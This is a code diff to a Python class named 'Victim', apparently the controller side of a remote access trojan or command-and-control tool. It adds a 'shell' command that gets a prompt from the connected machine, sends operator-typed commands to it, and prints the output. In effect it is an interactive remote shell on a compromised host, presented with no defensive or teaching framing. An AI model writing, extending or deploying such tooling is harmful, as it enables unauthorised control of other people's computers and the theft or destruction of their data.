@@ -14,10 +14,11 @@ class Victim:
         self.ip = addr[0]
         self.port = addr[1]
         self.commands = {
-            "ping": self.ping,
+            "ping": self.__ping,
+            "shell": self.__shell
         }
 
-    def ping(self) -> bool:
+    def __ping(self) -> bool:
         self.conn.send(b"ping")
         buffer = self.conn.recv()
         if buffer:
@@ -25,6 +26,28 @@ class Victim:
             return True
         else:
             return False
+
+    def __shell(self) -> bool:
+        # Tell client to enter shell mode
+        self.conn.send(b"shell")
+
+        exit_flag = True
+        while exit_flag:
+            # Get 'user:cwd' for prompt
+            prompt = self.conn.recv().decode()
+
+            while True:
+                cmd = input(f"{prompt} $ ")
+                if cmd == "exit":
+                    self.conn.send(cmd.encode())
+                    exit_flag = False
+                    break
+                elif cmd:
+                    self.conn.send(cmd.encode())
+                    buffer = self.conn.recv()
+                    print(buffer.decode())
+                    break
+        return True
 
     def enter_shell(self) -> bool:
         while True:
